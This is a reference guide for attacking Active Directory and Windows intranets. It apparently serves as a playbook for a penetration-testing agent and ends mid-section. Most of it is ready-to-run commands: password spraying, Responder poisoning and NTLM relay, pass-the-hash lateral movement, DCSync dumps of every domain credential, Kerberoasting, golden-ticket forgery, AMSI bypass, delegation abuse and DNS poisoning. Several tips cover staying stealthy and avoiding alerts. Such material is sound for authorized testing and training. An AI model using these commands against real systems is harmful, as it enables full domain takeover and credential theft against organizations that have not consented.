# Active Directory & Windows Intranet

> **When to read this file**: Read it when a task involves domain-environment penetration, Windows intranet lateral movement, SMB/WinRM/Kerberos/LDAP/MSSQL protocol attacks, domain credential dumping, or BloodHound attack path analysis.

## Quick Decision Table

| Scenario | First Choice | Alternatives | Key Differences |
|---|---|---|---|
| Bulk credential validation / password spraying | netexec (nxc) | crackmapexec | nxc is the actively maintained successor to the discontinued CME; the syntax is largely compatible |
| Get a SYSTEM shell on the target | impacket-psexec | impacket-wmiexec, evil-winrm | psexec's file-dropping service is the most reliable; wmiexec is fileless and stealthier; WinRM over 5985 requires the account to be in Remote Management Users |
| Dump all domain credentials | impacket-secretsdump | nxc smb --ntds | secretsdump has the most complete output and supports offline parsing of ntds.dit |
| Capture intranet NTLM hashes | responder | impacket-ntlmrelayx | Responder captures hashes for offline cracking; a relay exploits them directly (no cracking, but the target must not enforce signing) |
| Kerberoasting | impacket-GetUserSPNs | rubeus (Windows side), nxc ldap --kerberoasting | Prefer impacket from Linux; use rubeus when you already have a Windows session |
| AS-REP Roasting | impacket-getNPUsers | ldeep asreproast, rubeus asreproast | A single ordinary domain account is enough to launch it |
| AD attack path analysis | bloodhound CE | azurehound (Azure environments) | Graph-database analysis that locates the shortest path to Domain Admin |
| Collect AD data (no Windows shell) | bloodhound-ce-python | sharphound (must run on Windows) | The Python edition collects straight from Linux; SharpHound gathers more complete data (including sessions/local groups) |
| WinRM interactive shell | evil-winrm | evil-winrm-py, impacket-wmiexec | Native PTH/certificate auth, PS script loading, and file upload/download |
| Full LDAP enumeration | ldeep | nxc ldap, bloodyad | ldeep exports everything in one command; bloodyad leans toward write operations |
| Privilege-escalation write operations on AD objects | bloodyad | krbrelayx addspn | bloodyad specializes in ACL/attribute/password modification |
| Delegation/relay abuse (RBCD/UD) | krbrelayx + impacket-getST | rubeus s4u | The entire RBCD chain can be completed from Linux |
| Enumerate SMB shares and contents | smbmap | nxc smb --shares | smbmap supports recursive search, bulk download by extension, and PTH |
| RDP login | xfreerdp3 | rdesktop | FreeRDP3 is actively maintained; rdesktop is unmaintained |

## Typical Attack Chain: From Intranet Foothold to Domain Admin

```bash
# ── 阶段 0:侦察 ──
nxc smb <cidr>                                  # 探测存活 SMB 主机与签名状态
nxc smb <cidr> --gen-relay-list relay.txt       # 导出未强制签名的主机列表(中继目标)
sudo responder -I eth0 -A                       # 分析模式:只嗅探不毒化,评估环境噪音

# ── 阶段 1:Responder 毒化捕获 NTLMv2 hash ──
sudo responder -I eth0
# 捕获的 hash 写入 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
# 路径 1:离线破解(NTLMv2 = hashcat mode 5600)
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt <wordlist>
# 路径 2:不解密直接中继 —— 先在 /etc/responder/Responder.conf 把 SMB=Off、HTTP=Off,再:
sudo impacket-ntlmrelayx -tf relay.txt -smb2support

# ── 阶段 2:验证凭据与权限 ──
nxc smb <cidr> -u <user> -p <password>              # 输出 (Pwn3d!) = 对该机是本地管理员
nxc smb <ip> -u <user> -p <password> --sam --lsa    # 顺路转储本地 SAM/LSA 凭据

# ── 阶段 3:impacket 横向移动 ──
impacket-psexec '<domain>/<user>:<password>@<ip>'   # 半交互 SYSTEM shell
impacket-wmiexec -hashes :<nt_hash> '<domain>/<user>@<ip>'  # PTH,免落盘
impacket-secretsdump -just-dc '<domain>/<admin>:<password>@<dc_ip>'  # 拿下域管后全域转储

# ── 阶段 4:BloodHound 找提权路径 ──
bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip
# 将生成的 zip 上传 BloodHound CE,运行内置查询 "Shortest Path to Domain Admins"
# 依据路径类型选择后续手段:Kerberoasting / AS-REP / ACL 滥用(bloodyad)/ 委派(krbrelayx + getST)

# ── 阶段 5:Kerberos 攻击面 ──
impacket-GetUserSPNs -request -dc-ip <dc_ip> -outputfile kerb.txt '<domain>/<user>:<password>'
hashcat -m 13100 kerb.txt <wordlist>                # Kerberoast TGS(RC4)= mode 13100
```

## Core Tools in Depth

### impacket-psexec — get a semi-interactive SYSTEM shell on the target via an SMB service

**Purpose**: Mimics SysInternals PsExec — writes an executable into the ADMIN$ share, registers and starts it as a service, and gets a SYSTEM shell over the call-back connection.
**Install**: `sudo apt install impacket-scripts`
**When to use**: The most direct route to a shell when you hold local administrator credentials (password or NTLM hash) and the target exposes 445; the first choice when wmiexec is blocked or stable interaction is needed.

```bash
# 域账户密码认证
impacket-psexec '<domain>/<user>:<password>@<ip>'

# 本地(非域)账户
impacket-psexec '<user>:<password>@<ip>'

# Pass-the-hash(LM 部分留空)
impacket-psexec -hashes :<nt_hash> '<domain>/<user>@<ip>'

# ADMIN$ 不可写时指定其他可写共享
impacket-psexec -share C$ '<domain>/<user>:<password>@<ip>'

# Kerberos 认证(需先 export KRB5CCNAME=<ticket>.ccache,目标用 FQDN)
impacket-psexec -k -no-pass '<domain>/<user>@<target_fqdn>'
```

**Practical tips**:
- Requires ADMIN$ to be writable plus service-creation rights; ordinary domain users get `STATUS_ACCESS_DENIED`. Only hosts where `nxc` prints `(Pwn3d!)` are usable
- Writes a randomly named exe and service onto the target, visible in event log 7045; switch to wmiexec when stealth is needed
- Wrap the entire credential string in single quotes when the password contains special characters
- Use `<domain>/<user>` for domain accounts and plain `<user>` for local accounts

### impacket-smbexec — semi-interactive shell that executes cmd via a service and returns its output

**Purpose**: Same family as psexec but uploads no exe to the target: command output is returned through a bat file under `%SYSTEMROOT%\Temp` plus a named pipe — slightly less interactive but with fewer on-disk artifacts.
**Install**: `sudo apt install impacket-scripts`
**When to use**: When ADMIN$ cannot take an executable but a service can still be created; the fallback when psexec gets caught by file inspection.

```bash
# 密码认证
impacket-smbexec '<domain>/<user>:<password>@<ip>'

# Pass-the-hash
impacket-smbexec -hashes :<nt_hash> '<domain>/<user>@<ip>'
```

**Practical tips**:
- Still needs administrator service-creation rights and goes over 445
- Interaction is one command round-trip at a time; interactive programs are not supported (fall back to psexec for a full shell)
- Supports the same `-hashes`, `-k` (Kerberos), and `-dc-ip` flags as psexec/wmiexec/atexec

### impacket-scripts — impacket attack script suite (wmiexec/secretsdump/ntlmrelayx/GetUserSPNs etc.)

**Purpose**: Kali installs the scripts from impacket's official examples directory into PATH with the `impacket-` prefix — the core arsenal for intranet penetration: remote execution, credential dumping, NTLM relaying, and the full Kerberos attack set.
**Install**: `sudo apt install impacket-scripts` (one install provides all the commands below)
**When to use**: The default choice for lateral movement, domain credential dumping, relay attacks, and Kerberos ticket operations.

```bash
# ── wmiexec:通过 WMI 执行,不落盘、不创建服务,比 psexec 隐蔽 ──
impacket-wmiexec '<domain>/<user>:<password>@<ip>'
impacket-wmiexec -hashes :<nt_hash> '<domain>/<user>@<ip>'

# ── atexec:通过计划任务(schtasks/at)执行单条命令 ──
impacket-atexec '<domain>/<user>:<password>@<ip>' 'whoami /all'

# ── dcomexec:通过 DCOM(MMC20.Application 等)执行命令 ──
impacket-dcomexec -object MMC20 '<domain>/<user>:<password>@<ip>' 'whoami'

# ── mssqlclient 见独立条目;smbserver 见独立条目 ──

# ── secretsdump:远程转储 SAM/LSA/NTDS 凭据(无需 shell)──
impacket-secretsdump '<domain>/<user>:<password>@<ip>'
impacket-secretsdump -hashes :<nt_hash> '<domain>/<user>@<ip>'
# DCSync 方式只转储 NTDS.dit 域凭据(需域管/DC 权限)
impacket-secretsdump -just-dc '<domain>/<admin>:<password>@<dc_ip>'
# 只转储单个用户
impacket-secretsdump -just-dc-user <user> '<domain>/<admin>:<password>@<dc_ip>'
# 离线解析已抓取的 ntds.dit + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM local

# ── ntlmrelayx:中继 NTLM 认证(目标未强制签名时)──
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
# 中继成功后直接执行命令 / 转储 SAM
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
sudo impacket-ntlmrelayx -tf targets.txt -smb2support --sam
# socks 模式:中继认证挂起,供 proxychains 后续使用
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# 中继到 LDAPS 做委派利用(见 krbrelayx 条目)
sudo impacket-ntlmrelayx -t ldaps://<dc_ip> --delegate-access

# ── GetUserSPNs:Kerberoasting,请求所有 SPN 账户的 TGS ──
impacket-GetUserSPNs -request -dc-ip <dc_ip> '<domain>/<user>:<password>'
impacket-GetUserSPNs -request -dc-ip <dc_ip> -outputfile kerb.txt '<domain>/<user>:<password>'
# 只请求某个用户的票据
impacket-GetUserSPNs -request-user <svc_user> -dc-ip <dc_ip> '<domain>/<user>:<password>'

# ── getNPUsers:AS-REP Roasting,无预认证账户的 hash 可离线破解 ──
impacket-getNPUsers -dc-ip <dc_ip> -request -outputfile asrep.txt '<domain>/<user>:<password>'
# 无有效凭据时,用用户名字典探测哪些账户未开预认证
impacket-getNPUsers -dc-ip <dc_ip> -usersfile users.txt -no-pass -outputfile asrep.txt '<domain>/'

# ── getST:S4U2Self/S4U2Proxy 申请服务票据(委派/RBCD 利用)──
impacket-getST -spn 'cifs/<target_fqdn>' -impersonate administrator -dc-ip <dc_ip> '<domain>/<svc_user>:<password>'
export KRB5CCNAME=administrator.ccache   # 生成的 ccache 直接给 -k 参数的 impacket 工具用

# ── getTGT:申请 TGT(密码/hash 换票据)──
impacket-getTGT '<domain>/<user>:<password>'

# ── ticketer:伪造金票/银票 ──
impacket-ticketer -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain <domain> administrator
```

**Practical tips**:
- Kerberoast tickets go to `hashcat -m 13100`, AS-REP to `hashcat -m 18200`
- In secretsdump output, `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash; `-just-dc` mode also pulls the Kerberos keys (used for golden tickets)
- ntlmrelayx and Responder cannot both fight over the SMB/HTTP ports: in relay scenarios, turn SMB/HTTP off in `/etc/responder/Responder.conf` first
- The remote-execution tools (psexec/smbexec/wmiexec/atexec) need different rights: wmiexec/atexec only need WMI/RPC rights, while psexec/smbexec need full administrator

### impacket-mssqlclient — interactive MSSQL database client

**Purpose**: Interactive client for MSSQL (based on the TDS protocol), supporting SQL/Windows authentication, with built-in command-execution helpers such as `enable_xp_cmdshell`.
**Install**: `sudo apt install impacket-scripts`
**When to use**: After obtaining MSSQL credentials (sa or a domain account), execute system commands via xp_cmdshell and enumerate login targets (trusted links).

```bash
# SQL 认证
impacket-mssqlclient '<user>:<password>@<ip>'

# Windows 认证(本地账户)
impacket-mssqlclient -windows-auth '<user>:<password>@<ip>'

# Windows 认证(域账户)
impacket-mssqlclient -windows-auth '<domain>/<user>:<password>@<ip>'
```

Once inside the SQL shell:

```
enable_xp_cmdshell          # 开启 xp_cmdshell
xp_cmdshell whoami          # 执行系统命令
SELECT name FROM master..sysdatabases;   -- 枚举数据库
```

**Practical tips**:
- MSSQL defaults to port 1433; confirm it first with nmap/nxc mssql
- `nxc mssql <ip> -u <user> -p <password> --local-auth` can quickly validate credentials first
- MSSQL Trusted Links (mssql->mssql) allow hopping across servers to execute code; common in large intranets

### impacket-smbserver — stand up an SMB share server with one command

**Purpose**: Opens an anonymous SMB share rooted at the attacker machine's current directory, used to deliver files to targets or to trap SMB authentication initiated by them.
**Install**: `sudo apt install impacket-scripts`
**When to use**: File delivery when the target allows SMB but not HTTP; combined with scf/lnk files dropped into a writable share to capture hashes.

```bash
# 起名为 share 的匿名共享,根目录为当前目录(-smb2support 支持 SMB2)
impacket-smbserver share /path/to/dir -smb2support

# 带账号密码(目标需指定凭据访问)
impacket-smbserver share . -username <user> -password <pass> -smb2support
```

**Practical tips**:
- Access from the target side: `copy \\<attacker_ip>\share\payload.exe` or `net use \\<attacker_ip>\share /user:<user> <pass>`
- Conflicts with Responder: both listen on 445, so stop one before running the other
- Shut it down with Ctrl-C once the transfer is done; leaving it up makes it easy to spot in routine sweeps

### netexec — multi-protocol Swiss Army knife for bulk validation/enumeration/execution across large networks (CME successor)

**Purpose**: The actively maintained continuation of CrackMapExec (command `nxc`); a single command runs enumeration, credential validation, spraying, and command execution over SMB/WinRM/MSSQL/LDAP/SSH/RDP and other protocols against a batch of hosts.
**Install**: `sudo apt install netexec`
**When to use**: Any bulk scenario of the "I have credentials / I want to know who administers this machine" kind; confirm the account lockout threshold with it before credential spraying.

```bash
# ── 探测 ──
nxc smb <ip>                               # 版本/签名/主机名
nxc smb <cidr> --gen-relay-list relay.txt  # 导出未强制签名主机(给 ntlmrelayx)

# ── 凭据验证(密码喷洒核心用法)──
nxc smb <ip> -u <user> -p <password>
nxc smb <cidr> -u users.txt -p passwords.txt --continue-on-success
nxc smb <ip> -u '' -p ''                            # 空会话
nxc smb <ip> -u <user> -H <ntlm_hash>              # Pass-the-hash
nxc smb <ip> -u <user> -p <password> --local-auth  # 强制本地 SAM 认证

# ── 枚举 ──
nxc smb <ip> -u <user> -p <password> --shares
nxc smb <ip> -u <user> -p <password> --smb-sessions
nxc smb <ip> -u <user> -p <password> --loggedon-users   # 定位域管登录在哪台机
nxc smb <ip> -u <user> -p <password> --users --groups
nxc smb <ip> -u <user> -p <password> --pass-pol          # 锁定阈值,喷洒前必看

# ── 凭据转储 ──
nxc smb <ip> -u <user> -p <password> --sam
nxc smb <ip> -u <user> -p <password> --lsa
nxc smb <dc_ip> -u <admin> -p <password> --ntds          # 对 DC 转储全域 hash

# ── 命令执行 ──
nxc smb <ip> -u <user> -p <password> -x 'whoami'         # cmd
nxc smb <ip> -u <user> -p <password> -X 'whoami'         # powershell
nxc winrm <ip> -u <user> -p <password> -X 'whoami'

# ── LDAP 攻击 ──
nxc ldap <dc_ip> -u <user> -p <password> --kerberoasting kerb.txt
nxc ldap <dc_ip> -u <user> -p <password> --asreproast asrep.txt

# ── MSSQL ──
nxc mssql <ip> -u <user> -p <password> --local-auth
```

**Practical tips**:
- `(Pwn3d!)` in the output means the credentials are local administrator on that target — go straight to impacket-psexec
- Always read `--pass-pol` before spraying: the lockout threshold is typically 5 attempts/30 minutes; spraying cadence = 1 password × all users
- Any account that succeeds on `nxc winrm` can get an interactive shell with evil-winrm
- The workspace database lives in `~/.nxc` (CME in `~/.cme`) and records every historically successful credential

### crackmapexec — netexec's predecessor (no longer maintained)

**Purpose**: The classic intranet Swiss Army knife, same origin and syntax as netexec but now unmaintained; new engagements should use netexec directly.
**Install**: `sudo apt install crackmapexec`
**When to use**: When the target environment's documentation or legacy scripts are written against cme syntax; otherwise switch to nxc across the board.

```bash
# 语法与 netexec 一致,协议模块 smb/winrm/mssql/ldap 等
crackmapexec smb <ip> -u <user> -p <password> --shares
crackmapexec smb <dc_ip> -u <admin> -p <password> --ntds
cme smb <cidr> -u users.txt -p <password> --continue-on-success   # 短命令 cme
```

**Practical tips**:
- cme and nxc cannot run against the same database directory simultaneously
- Some old modules (e.g. --wcc, --spider) have been reworked in nxc into the `-M <module>` module system

### responder — LLMNR/NBT-NS/mDNS poisoner, the go-to hash-capture tool for intranets

**Purpose**: Forges intranet name-resolution responses (LLMNR/NBT-NS/mDNS) to intercept SMB/HTTP/LDAP and other authentication initiated by hosts, yielding NTLMv2 hashes that can be cracked offline; a rogue WPAD proxy is built in.
**Install**: `sudo apt install responder`
**When to use**: One of the first moves after entering an intranet — wait for (or induce) hosts to access nonexistent resource names; the main credential source when starting from zero credentials.

```bash
# 常规:监听指定接口,毒化并捕获认证
sudo responder -I eth0

# 分析模式:只嗅探不毒化,先评估环境再动手
sudo responder -I eth0 -A

# 官网示例:指定本机 IP,开启 WPAD 伪装代理、netbios wredir 应答与指纹
responder -i <ip> -w On -r On -f On
```

**Practical tips**:
- Captured hashes land in `/usr/share/responder/logs/` (SMB-NTLMv2-SSP-*.txt); crack them with `hashcat -m 5600`
- When cracking stalls, switch to relay: set `SMB=Off` and `HTTP=Off` in `/etc/responder/Responder.conf` and let `impacket-ntlmrelayx` take over 445/80
- Pre-filter targets without signing enforcement with `nxc smb <cidr> --gen-relay-list` before relaying
- The challenge value is fixed by default in the Challenge field of Responder.conf; customizing it to all zeros eases rainbow-table and quick-crack triage

### evil-winrm — WinRM interactive shell (most full-featured)

**Purpose**: Gets an interactive PowerShell on the target over WinRM (5985/5986); supports password/NTLM hash/certificate authentication, PS script and exe loading, file upload/download, and AMSI bypass.
**Install**: `sudo apt install evil-winrm`
**When to use**: The first choice for an interactive shell when the account sits in the Remote Management Users group (common with svc accounts granted it by mistake).

```bash
# 密码认证
evil-winrm -i <ip> -u <user> -p <password>

# Pass-the-hash
evil-winrm -i <ip> -u <user> -H <ntlm_hash>

# SSL(5986)
evil-winrm -i <ip> -S -u <user> -p <password>

# 证书认证(AD CS 滥用拿到证书后)
evil-winrm -i <ip> -S -c cert.pem -k priv.key

# 预加载 PowerShell 脚本目录与可执行文件目录
evil-winrm -i <ip> -u <user> -p <password> -s /usr/share/nishang/Gather/ -e /opt/binaries/
```

Built-in commands once inside the shell:

```
menu                       # 列出可用扩展命令
Bypass-4MSI                # AMSI bypass(执行 ps 脚本前先跑)
upload /local/file.exe C:\\Temp\\file.exe
download C:\\Temp\\loot.txt /tmp/loot.txt
```

**Practical tips**:
- Confirm a `[+]` success with `nxc winrm <ip> -u <user> -p <password>` before connecting, to avoid locking the account
- WinRM authentication that succeeds without administrator rights has no file-transfer permission; escalate privileges before uploading
- In Kerberos environments, tickets can be used with `-r <domain>` (run kinit first)

### bloodhound — AD attack-path graph analysis platform (CE edition)

**Purpose**: BloodHound Community Edition models AD relationships (membership, ACLs, sessions, delegation, GPOs) into a graph database and automatically discovers the shortest privilege-escalation path from an ordinary account to Domain Admins.
**Install**: `sudo apt install bloodhound`
**When to use**: A must-do step after obtaining any domain account — it computes the ACL/delegation/nested-group paths that manual review cannot see.

```bash
# Kali 包把 CE 部署文件放在 /usr/share/bloodhound,以 docker compose 运行
cd /usr/share/bloodhound && sudo docker compose up -d
# 首次启动从日志中取 admin 初始随机密码
sudo docker compose logs 2>&1 | grep -i password
# 浏览器访问 http://127.0.0.1:8080/ui/login,首次登录强制改密
```

**Practical tips**:
- Ingest the zips produced by collectors (bloodhound-ce-python / sharphound / rubeus) through Upload in the top-right corner of the UI
- Frequently used built-in queries: Shortest Path to Domain Admins, Kerberoastable Users, AS-REP Roastable Users, Find Workstations where Domain Users are Logged In
- Quick Cypher lookup (AS-REP roastable accounts): `MATCH (u:User {dontreqpreauth: true}) RETURN u`
- The more data collected (especially Session/LocalAdmin), the more accurate the paths; `-c DCOnly` is the quietest but yields no session data

### bloodhound-python / bloodhound-ce-python — remotely collect AD data from Linux

**Purpose**: impacket-based BloodHound collector that pulls all of the domain's data straight from Linux with just one domain account; `bloodhound-ce-python` targets CE, while the older `bloodhound-python` targets legacy (≤4.3.1).
**Install**: `sudo apt install bloodhound-python` (Kali now ships it as the bloodhound-ce-python package, with the `bloodhound-ce-python` command)
**When to use**: Pure-Linux collection when there is no Windows shell to run SharpHound.

```bash
# 全量采集(密码认证);-ns 指定解析用的 DC
bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip

# Pass-the-hash
bloodhound-ce-python -d <domain> -u <user> -hashes :<nt_hash> -ns <dc_ip> -c All

# 只采 DC 数据(不碰成员机,最安静,无会话/本地组信息)
bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c DCOnly

# 旧版 BloodHound(<=4.3.1)用:
bloodhound-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip
```

**Practical tips**:
- Upload the resulting `*_bloodhound.zip` straight into BloodHound CE
- `--zip` bundles all the json; without it, the output is loose json files
- DNS must be able to resolve the domain name (pointing `-ns` at the DC is enough; no need to change global DNS); for Kerberos authentication add `-k` and pair it with kinit

### sharphound — C# BloodHound collector (runs on Windows)

**Purpose**: The official C# collector with the most complete data (sessions, local groups, ACLs, delegation, GPOs); suited to a one-shot full collection once a Windows shell is in hand.
**Install**: `sudo apt install sharphound` (Kali ships a prebuilt exe)
**When to use**: After getting a Windows shell via evil-winrm/psexec, to collect deep data (especially Sessions).

```bash
# 定位 Kali 包内的 exe,上传到目标
dpkg -L sharphound
evil-winrm -i <ip> -u <user> -p <password>
# evil-winrm shell 内:
upload /usr/share/sharphound/SharpHound.exe C:\\Temp\\SharpHound.exe
```

Run on the target machine:

```
SharpHound.exe -c All
SharpHound.exe -c All --Stealth           # 低速模式,减少流量特征
SharpHound.exe -c Session --Domain <domain>   # 只采会话,定位域管登录位置
```

**Practical tips**:
- The resulting `*_BloodHound.zip` lands in the current directory; download it back and upload it to BloodHound
- Session collection (Loop) queries the DC heavily; `--Stealth` or running `Session` only keeps the noise under control
- Requires .NET 4.6.2+; use an older SharpHound build on legacy systems

### rubeus — Kerberos primitives toolkit for the Windows side (C#)

**Purpose**: Drives the whole Kerberos workflow on Windows: requesting/importing/dumping tickets, Kerberoasting, AS-REP, S4U delegation abuse, and pass-the-ticket.
**Install**: `sudo apt install rubeus` (Kali ships the exe; locate it with `dpkg -L rubeus` and upload it)
**When to use**: When a Windows shell is already in hand and the target speaks Kerberos (port 88 reachable to the DC); working with tickets here leaves fewer cross-protocol traces than doing it from Linux.

```bash
dpkg -L rubeus    # 定位 Rubeus.exe 并上传到目标
```

Run inside the target (evil-winrm shell):

```
Rubeus.exe kerberoast /outfile:C:\Temp\kerb.txt          # Kerberoasting
Rubeus.exe asreproast /format:hashcat /nowrap            # AS-REP Roasting
Rubeus.exe tgtdeleg /nowrap                               # 无票据情况下获取可用 TGT(Base64)
Rubeus.exe hash /password:<password> /user:<user> /domain:<domain>   # 生成 RC4/AES key
Rubeus.exe asktgt /user:<user> /password:<password> /ptt  # 申请 TGT 并注入当前会话
Rubeus.exe dump                                           # 转储当前会话票据
Rubeus.exe ptt /ticket:<base64_kirbi>                     # 票据传递
Rubeus.exe s4u /user:<svc_user> /rc4:<nt_hash> /impersonate:administrator /msdsspn:"cifs/<target>" /ptt   # S4U2Self+Proxy
Rubeus.exe harvest /interval:30                           # 持续收割内存中新建票据
```

**Practical tips**:
- `/nowrap` prints a single-line Base64 kirbi for easy copying; converting it for Linux use requires a kirbi→ccache conversion (ticket_converter)
- Crack kerberoast output with `hashcat -m 13100`
- `/ptt` (pass the ticket) takes effect immediately, requiring nothing beyond klist purge; s4u is the core of RBCD/constrained delegation exploitation

### kerberoast — Kerberos attack script collection (with ticket cracking)

**Purpose**: The classic Kerberoast toolkit: GetUserSPNs to request tickets, tgsrepcrack/kirbi2john to crack them, and ticket extraction from pcaps.
**Install**: `sudo apt install kerberoast` (scripts live in `/usr/share/kerberoast/`)
**When to use**: When .kirbi tickets need offline cracking, or as a fallback collection method where no impacket environment exists.

```bash
# 破解 kirbi 票据(字典攻击)
python3 /usr/share/kerberoast/tgsrepcrack.py <wordlist> <ticket.kirbi>

# kirbi 转 john 格式再破解
python3 /usr/share/kerberoast/kirbi2john.py <ticket.kirbi> > hash.txt
john --wordlist=<wordlist> hash.txt

# 从抓包中提取票据
python3 /usr/share/kerberoast/extracttgsrepfrompcap.py <capture.pcap>

# 查看包内全部脚本(GetUserSPNs.ps1/.vbs 需复制到 Windows 执行)
ls /usr/share/kerberoast/
```

**Practical tips**:
- `hashcat -m 13100` is faster for modern RC4-HMAC tickets; tgsrepcrack suits GPU-less scenarios
- Dictionary attacks barely scratch AES tickets (`krb5tgs$18`); prioritize service accounts still using RC4
- GetUserSPNs.ps1 can request every SPN ticket from any Windows host in the domain as an ordinary user

### krbrelayx — Kerberos relaying and delegation abuse suite

**Purpose**: A suite for Kerberos relaying + unconstrained delegation capture + SPN/LDAP operations; bundles krbrelayx, addspn, printerbug, and dnstool.
**Install**: `sudo apt install krbrelayx`
**When to use**: The full RBCD (resource-based constrained delegation) chain, capturing DC tickets through unconstrained delegation, and ADIDNS wildcard record poisoning.

```bash
# ── RBCD 利用链 ──
# 1. 中继机器账户认证到 LDAPS,给攻击机机器账户加 RBCD 权限(--delegate-access)
sudo impacket-ntlmrelayx -t ldaps://<dc_ip> --delegate-access
# 2. 触发目标机器向攻击机认证(printerbug 触发回连)
printerbug '<domain>/<user>:<password>@<target_ip>' <attacker_ip>
# 3. 攻击机机器账户 S4U 申请目标机器的服务票据
impacket-getST -spn 'cifs/<target_fqdn>' -impersonate administrator -dc-ip <dc_ip> '<domain>/<attacker_machine>$:<machine_password>'
export KRB5CCNAME=administrator.ccache
# 4. Kerberos 方式登录目标
impacket-psexec -k -no-pass '<domain>/administrator@<target_fqdn>'

# ── 非约束委派捕获:攻击机账户被配置 UD 后,钓 DC 的 TGT ──
sudo krbrelayx -aesKey <aes256_key_of_delegated_machine_account>
printerbug '<domain>/<user>:<password>@<dc_ip>' <attacker_ip>
# 捕获到 DC TGT 后保存为 ccache,用 secretsdump -k 直接 DCSync

# ── addspn:通过 LDAP 给账户增删 SPN ──
addspn -u '<domain>\<user>' -p '<password>' -t <target> -s 'cifs/<target_fqdn>' <dc_ip>

# ── dnstool:ADIDNS 记录操作(通配符投毒配合 Responder)──
dnstool -u '<domain>\<user>' -p '<password>' --record '*' --action query <dc_ip>
dnstool -u '<domain>\<user>' -p '<password>' --record '*' --action add --data <attacker_ip> <dc_ip>
```

**Practical tips**:
- RBCD prerequisites: the ability to modify the target machine object's `msDS-AllowedToActOnBehalfOfOtherIdentity` (e.g. holding GenericWrite/GenericAll) plus a controllable machine account (create one with `impacket-addcomputer '<domain>/<user>:<password>' -computer-name 'EVIL$' -computer-pass <pass>`; ordinary domain users can create machine accounts by default, success depending on the domain's MachineAccountQuota)
- Relaying to LDAPS requires the target DC's certificate to be valid and signing/channel binding not enforced (commonly exploitable under default configurations)
- dnstool's `-u` takes the backslash form `domain\user`, unlike the impacket family's `domain/user`

### bloodyad — AD privilege-escalation write-operation framework (LDAP)

**Purpose**: Performs privilege-escalation write operations directly against the DC's LDAP: modify attributes, add objects, reset passwords, grant ACL rights; supports password/PTH/ticket/certificate authentication and can transparently go through a SOCKS proxy.
**Install**: `sudo apt install bloodyad`
**When to use**: To execute in practice the ACL abuse paths (GenericAll/WriteProperty/WriteDacl etc.) that BloodHound finds.

```bash
# 通用格式:bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> <子命令>
# Pass-the-hash 用 -ht <ntlm_hash> 替代 -p

# 读取对象属性(确认 userAccountControl、SPN 等)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> getObjectAttributes '<dn>' sAMAccountName userAccountControl

# 添加域用户
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> addUser <new_user> <new_password>

# 给指定账户加 GenericAll(ACL 滥用核心)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> addGenericAll '<target_dn>' <grantee_user>

# 重置任意用户密码(需对该对象有 WriteProperty/AllExtendedRights)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> setPassword '<target_dn>' <new_password>

# 修改 userAccountControl(如开启 DONT_REQ_PREAUTH 为 AS-REP 做准备)
bloodyad --host <dc_ip> -d <domain> -u <user> -p <password> setObjectAttribute '<target_dn>' userAccountControl 4194304
```

**Practical tips**:
- `<dn>` looks like `CN=<user>,CN=Users,DC=corp,DC=local`
- Plenty of ordinary domain users hold excess ACLs on OU/group objects — confirm the path with BloodHound first instead of writing blindly and tripping alerts
- Works without LDAPS too (plaintext LDAP), an alternative when the intranet blocks 636

### ldeep — in-depth LDAP enumeration tool

**Purpose**: Full LDAP enumeration and export of a domain — users/groups/computers/SPNs/GPOs/OUs/trusts/AS-REP accounts and more, written to disk in a single command.
**Install**: `sudo apt install ldeep`
**When to use**: Quickly mapping domain objects when the domain account in hand cannot run BloodHound (or lightweight plain-text results are wanted); also for offline review of cached data (`ldeep cache`).

```bash
# 全量枚举并落盘
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> all

# 分类枚举
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> users
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> groups
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> computers
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> kerberos      # SPN 账户
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> asreproast    # 无预认证账户
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> trusts
ldeep ldap -d <domain> -u <user> -p <password> -s <dc_ip> gpo

# Pass-the-hash
ldeep ldap -d <domain> -u <user> -H <ntlm_hash> -s <dc_ip> all

# 结果写文件
ldeep -o out.txt ldap -d <domain> -u <user> -p <password> -s <dc_ip> users
```

**Practical tips**:
- `-o` writes to disk; `all` produces heavy output on large domains, so start with `users`/`groups` in stages
- Adding `--security_desc` (also a top-level parameter, so it must come before the `ldap` subcommand) exports security descriptors for offline ACL analysis
- `kerberos`/`asreproast` output feeds directly into follow-up attacks (GetUserSPNs/getNPUsers)

### smbmap — SMB share enumeration and content search

**Purpose**: Enumerates the share lists and permissions (read/write) of an entire domain, browses/downloads/uploads files recursively, supports bulk auto-download by extension and remote command execution, and supports PTH.
**Install**: `sudo apt install smbmap`
**When to use**: Locating writable shares (for dropping decoy files) and shares that hold sensitive files (backups, configurations, scripts).

```bash
# 列出共享与权限(READ/WRITE 标记)
smbmap -H <ip> -u <user> -p <password> -d <domain>

# Pass-the-hash(hash 作密码传入)
smbmap -H <ip> -u <user> -p <ntlm_hash> -d <domain>

# 递归列出共享内容
smbmap -H <ip> -u <user> -p <password> -R <share>

# 搜索并按扩展名自动下载(A 参数模式)
smbmap -H <ip> -u <user> -p <password> -R <share> -A <pattern>

# 下载 / 上传单个文件
smbmap -H <ip> -u <user> -p <password> --download '<share>\\path\\file.txt'
smbmap -H <ip> -u <user> -p <password> --upload /local/file.txt '<share>\\path\\file.txt'

# 远程命令执行(需可写共享 + 服务权限)
